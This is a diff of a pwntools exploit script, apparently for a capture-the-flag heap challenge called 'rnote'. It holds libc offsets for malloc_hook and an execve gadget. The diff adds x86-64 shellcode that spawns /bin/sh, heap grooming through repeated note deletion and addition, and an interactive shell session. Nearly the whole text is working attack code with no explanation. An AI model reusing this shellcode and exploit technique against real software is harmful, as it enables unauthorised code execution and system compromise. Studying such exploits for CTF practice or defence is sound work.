@@ -16,9 +16,9 @@ if LOCAL:
     smlbin_area_off = 0x3C3B78
     execv_binsh_off = 0xF0567
     malloc_hook_off = 0x3C3B10
-    context.log_level = "debug"
+    #context.log_level = "debug"
     mine_env = os.environ
-    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
+    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
     io = process(elf_name, env=mine_env)
 else:
     printf_off = 0x4CDD0
@@ -38,10 +38,8 @@ def add_note(mcontent):
     io.recvuntil("no more than 250 characters")
     dlySend(mcontent)
 
-def show_note(mindex):
+def show_note():
     mmenu(1)
-    io.recvuntil("Which Note do you want to show: ")
-    io.sendline(str(mindex))
 
 def delete_note():
     mmenu(2)
@@ -50,19 +48,36 @@ def exit_rnote():
     mmenu(3)
 
 def s_leak():
-    for i in range(1):
-        padding = chr(ord('A')+i)*0x40+'\n'
-        add_note(padding)
-    delete_note()
+
+    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+    '''
+    for i in range(2):
+        delete_note()
     for i in range(1):
         padding = chr(ord('a')+i)*0x08+'\n'
         add_note(padding)
-    pause()
-    padding = 'r'*0x40+'\n'
-    add_note(padding)
-    pause()
-    for i in range(4):
+    show_note()
+    io.recvuntil("the total of notes is ")
+    data = int(io.recvline()[:-1])
+    log.info(hex(data))
+    for i in range(1):
         delete_note()
+    for i in range(1):
+        padding = chr(ord('a')+i)*0x08+'\n'
+        add_note(padding)
+    show_note()
+    io.recvuntil("the total of notes is ")
+    data = int(io.recvline()[:-1])
+    log.info(hex(data))
+    '''
+    for i in range(12):
+        delete_note()
+    for i in range(1):
+        add_note(shellcode+'\n')
+
+    time.sleep(2)
+    delete_note()
+    io.interactive()
     #return libc_base_addr
 
 def s_exp():
